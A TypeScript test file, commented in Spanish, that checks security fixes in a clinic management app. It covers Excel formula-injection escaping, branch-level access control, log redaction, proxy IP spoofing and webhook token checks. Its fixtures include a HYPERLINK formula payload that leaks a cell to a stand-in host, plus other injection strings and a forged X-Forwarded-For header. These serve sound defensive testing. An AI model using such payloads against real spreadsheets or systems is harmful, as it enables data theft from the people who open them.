// Pruebas de regresión de la auditoría de seguridad interna (Equipo Q, antes del piloto).
import { readdirSync, readFileSync, statSync } from "node:fs";
import { join } from "node:path";
import ExcelJS from "exceljs";
import Fastify from "fastify";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { parseTrustProxy, trustProxyOption } from "../server/src/config.js";
import { redactUrl, serializeError, loggerOptions } from "../server/src/lib/logger.js";
import { safeCell, sanitizeWorkbook } from "../server/src/lib/xlsxSafe.js";
import { addUser, createClinic, createPatient, login, procedureId, setupEnv, teardown, type Agent, type Env, type TestClinic } from "./helpers.js";

let env: Env;
let K: TestClinic;
let owner: Agent;
beforeAll(async () => {
  env = await setupEnv();
  K = await createClinic(env.db, { branches: 2 });
  owner = await login(env.app, K.ownerEmail);
});
afterAll(async () => teardown(env));

async function readXlsx(buf: Buffer) {
  const wb = new ExcelJS.Workbook();
  await wb.xlsx.load(buf as unknown as ArrayBuffer);
  const out: unknown[] = [];
  wb.eachSheet((ws) => ws.eachRow((row) => row.eachCell((c) => out.push(c.value))));
  return out;
}

describe("exportaciones a Excel sin inyección de fórmulas", () => {
  it("payments.xlsx (B-085): el nombre del paciente que empieza con = sale como texto", async () => {
    const evil = "=HYPERLINK(\"http://x.test/?\"&A1,\"ver\")";
    const p = await createPatient(owner, { firstName: evil, lastName: "+SUM(1,1)" });
    const r = await owner.post("/api/payments", { branchId: K.branches[0], patientId: p, amountCents: 1000, method: "cash", idempotencyKey: `q-${Date.now()}` });
    expect(r.status).toBe(200);
    const x = await env.app.inject({ method: "GET", url: "/api/reports/payments.xlsx", headers: { cookie: owner.cookie } });
    expect(x.statusCode).toBe(200);
    const cells = await readXlsx(x.rawPayload);
    const name = cells.find((v) => typeof v === "string" && v.includes("HYPERLINK"));
    expect(name).toBe(`'${evil} +SUM(1,1)`);
    for (const v of cells) {
      if (typeof v === "string") expect(v).not.toMatch(/^[=+\-@\t\r]/);
      else if (v && typeof v === "object") expect(v).not.toHaveProperty("formula");
    }
  });

  it("el saneador cubre texto, texto enriquecido, fórmulas e hipervínculos, y los signos de ancho completo", () => {
    const wb = new ExcelJS.Workbook();
    const ws = wb.addWorksheet("x");
    ws.addRow(["=1+1", "-2", "@cmd", "\tx", "ok", 5, "＝1+1"]);
    ws.addRow([{ richText: [{ text: "=A1" }] }, { formula: "A1*2" }, { text: "+ver", hyperlink: "http://malo.test" }]);
    sanitizeWorkbook(wb);
    expect(ws.getRow(1).values).toEqual([undefined, "'=1+1", "'-2", "'@cmd", "'\tx", "ok", 5, "'＝1+1"]);
    expect(ws.getCell(2, 1).value).toEqual({ richText: [{ text: "'=A1" }] });
    expect(ws.getCell(2, 2).value).toBe("'=A1*2");
    expect(ws.getCell(2, 3).value).toBe("'+ver");
    expect(safeCell("María")).toBe("María");
  });

  it("ninguna exportación escribe el archivo sin pasar por xlsxBuffer()", () => {
    const root = join(__dirname, "../server/src");
    const offenders: string[] = [];
    const walk = (d: string) => {
      for (const f of readdirSync(d)) {
        const p = join(d, f);
        if (statSync(p).isDirectory()) walk(p);
        else if (p.endsWith(".ts") && !p.endsWith("lib/xlsxSafe.ts") && /\.xlsx\.write(Buffer|File)?\(/.test(readFileSync(p, "utf8"))) offenders.push(p);
      }
    };
    walk(root);
    expect(offenders).toEqual([]);
  });
});

describe("alcance por sucursal en escrituras por id", () => {
  it("lista de espera: recepción de la sucursal 1 no cambia una entrada de la sucursal 2", async () => {
    const rec1 = await login(env.app, (await addUser(env.db, K.clinicId, "receptionist", { branchIds: [K.branches[0]!] })).email);
    const p = await createPatient(owner);
    const w = await owner.post("/api/waitlist", { branchId: K.branches[1], patientId: p });
    expect(w.status).toBe(200);
    const r = await rec1.post(`/api/waitlist/${w.body.id}/status`, { status: "cancelled" });
    expect(r.status).toBe(403);
    const row = (await env.db.adminPool.query("SELECT status FROM waitlist_entries WHERE id = $1", [w.body.id])).rows[0];
    expect(row.status).toBe("waiting");
    expect((await owner.post(`/api/waitlist/${w.body.id}/status`, { status: "cancelled" })).status).toBe(200);
  });

  it("presupuestos: no se anula un tratamiento de un presupuesto de otra sucursal", async () => {
    const dent = await addUser(env.db, K.clinicId, "dentist", { allBranches: true });
    const rec1 = await login(env.app, (await addUser(env.db, K.clinicId, "receptionist", { branchIds: [K.branches[0]!] })).email);
    const p = await createPatient(owner);
    const b = await owner.post("/api/budgets", { branchId: K.branches[1], patientId: p, dentistId: dent.id, items: [{ procedureId: await procedureId(env.db, K.clinicId, "PRE-01"), unitPriceCents: 10000 }] });
    expect(b.status).toBe(200);
    const item = (await owner.get(`/api/budgets/${b.body.id}`)).body.items[0];
    const r = await rec1.post(`/api/budget-items/${item.id}/cancel`, { reason: "Prueba de alcance" });
    expect(r.status).toBe(403);
    expect((await env.db.adminPool.query("SELECT status FROM budget_items WHERE id = $1", [item.id])).rows[0].status).toBe("pending");
    expect((await owner.post(`/api/budget-items/${item.id}/cancel`, { reason: "Prueba de alcance" })).status).toBe(200);
  });
});

describe("registro de auditoría (/api/audit)", () => {
  it("sin acceso clínico se ve la acción clínica pero no su detalle; con acceso clínico, sí", async () => {
    const dent = await addUser(env.db, K.clinicId, "dentist", { allBranches: true });
    const d = await login(env.app, dent.email);
    const p = await createPatient(owner);
    expect((await d.post(`/api/patients/${p}/odontogram`, { tooth: 16, surfaces: ["O"], condition: "caries", state: "existing" })).status).toBe(200);
    const asOwner = (await owner.get(`/api/audit?entity=patient&entityId=${p}`)).body as any[];
    const rowO = asOwner.find((r) => r.action === "odontogram.recorded");
    expect(rowO.data).toEqual({ detalle: "reservado: datos clínicos" });
    const asDent = await d.get(`/api/audit?entity=patient&entityId=${p}`);
    expect(asDent.status).toBe(403); // el odontólogo no tiene audit.read
    const proAdmin = await addUser(env.db, K.clinicId, "admin", { allBranches: true, professional: true });
    const rowA = ((await (await login(env.app, proAdmin.email)).get(`/api/audit?entity=patient&entityId=${p}`)).body as any[]).find((r) => r.action === "odontogram.recorded");
    expect(rowA.data).toMatchObject({ tooth: 16, condition: "caries" });
  });

  it("una administración limitada a una sucursal no ve la auditoría de otra sucursal", async () => {
    const adm = await login(env.app, (await addUser(env.db, K.clinicId, "admin", { branchIds: [K.branches[0]!] })).email);
    const p = await createPatient(owner);
    const pay = await owner.post("/api/payments", { branchId: K.branches[1], patientId: p, amountCents: 1500, method: "cash", idempotencyKey: `q-${Date.now()}-b2` });
    expect(pay.status).toBe(200);
    const rows = (await adm.get(`/api/audit?entity=payment&entityId=${pay.body.id}`)).body as any[];
    expect(rows).toEqual([]);
    expect(((await owner.get(`/api/audit?entity=payment&entityId=${pay.body.id}`)).body as any[]).length).toBe(1);
  });
});

describe("IP del cliente detrás del proxy (límites por IP)", () => {
  it("en producción se confía en 1 proxy por defecto, nunca en todos; valores inválidos se rechazan", () => {
    expect(parseTrustProxy(undefined, true)).toBe(1);
    expect(parseTrustProxy(undefined, false)).toBe(false);
    expect(parseTrustProxy("1", false)).toBe(1);
    expect(parseTrustProxy("0", true)).toBe(false);
    expect(() => parseTrustProxy("true", true)).toThrow(/TRUST_PROXY/);
  });

  it("un X-Forwarded-For falso escrito por el cliente no cambia su IP", async () => {
    const app = Fastify({ trustProxy: trustProxyOption(1) });
    app.get("/ip", async (req) => ({ ip: req.ip }));
    // El proxy (127.0.0.1) agrega la IP real (203.0.113.7) al final de lo que mandó el cliente.
    const r = await app.inject({ method: "GET", url: "/ip", remoteAddress: "127.0.0.1", headers: { "x-forwarded-for": "1.1.1.1, 2.2.2.2, 203.0.113.7" } });
    expect(r.json().ip).toBe("203.0.113.7");
    const direct = await app.inject({ method: "GET", url: "/ip", remoteAddress: "198.51.100.9" });
    expect(direct.json().ip).toBe("198.51.100.9");
    await app.close();
  });
});

describe("registros (logs) sin datos de pacientes ni tokens", () => {
  it("la ruta se registra sin la cadena de consulta y sin los tokens públicos", () => {
    expect(redactUrl("/api/patients?q=Juan%20Perez%20CI%201234567")).toBe("/api/patients?[omitido]");
    expect(redactUrl("/api/public/confirmar/abc.def")).toBe("/api/public/confirmar/[token]");
    expect(redactUrl("/api/public/budget-links/TOKEN123/verify")).toBe("/api/public/budget-links/[token]/verify");
    expect(redactUrl("/api/public/verify/ABCD-EFGH-JKMN")).toBe("/api/public/verify/[token]");
    expect(redactUrl("/p/presupuesto/abcdef")).toBe("/p/presupuesto/[token]");
    expect(redactUrl("/api/clinical-files/1/content?t=secreto")).toBe("/api/clinical-files/1/content?[omitido]");
    expect(redactUrl("/api/patients/123")).toBe("/api/patients/123");
    const req = (loggerOptions.serializers as any).req({ method: "GET", url: "/api/patients?q=Ana", ip: "10.0.0.1", headers: { cookie: "dsid=secreto" } });
    expect(req).toEqual({ method: "GET", url: "/api/patients?[omitido]", remoteAddress: "10.0.0.1" });
  });

  it("los errores de PostgreSQL se registran sin el detalle con valores de la fila", () => {
    const e = Object.assign(new Error("duplicate key value violates unique constraint"), { code: "23505", detail: "Key (document_number)=(1234567) already exists.", constraint: "patients_document_uq", where: "x" });
    const s = serializeError(e) as Record<string, unknown>;
    expect(s.constraint).toBe("patients_document_uq");
    expect(JSON.stringify(s)).not.toContain("1234567");
  });
});

describe("webhook de WhatsApp", () => {
  it("la verificación compara el token sin filtrar su largo y rechaza tokens parecidos", async () => {
    process.env.WHATSAPP_VERIFY_TOKEN = "token-secreto";
    try {
      const ok = await env.app.inject({ method: "GET", url: "/api/webhooks/whatsapp?hub.mode=subscribe&hub.verify_token=token-secreto&hub.challenge=42" });
      expect(ok.statusCode).toBe(200);
      expect(ok.body).toBe("42");
      for (const t of ["token-secret", "token-secreto ", "", "TOKEN-SECRETO"]) {
        const r = await env.app.inject({ method: "GET", url: `/api/webhooks/whatsapp?hub.mode=subscribe&hub.verify_token=${encodeURIComponent(t)}&hub.challenge=42` });
        expect(r.statusCode).toBe(403);
      }
    } finally {
      delete process.env.WHATSAPP_VERIFY_TOKEN;
    }
  });
});
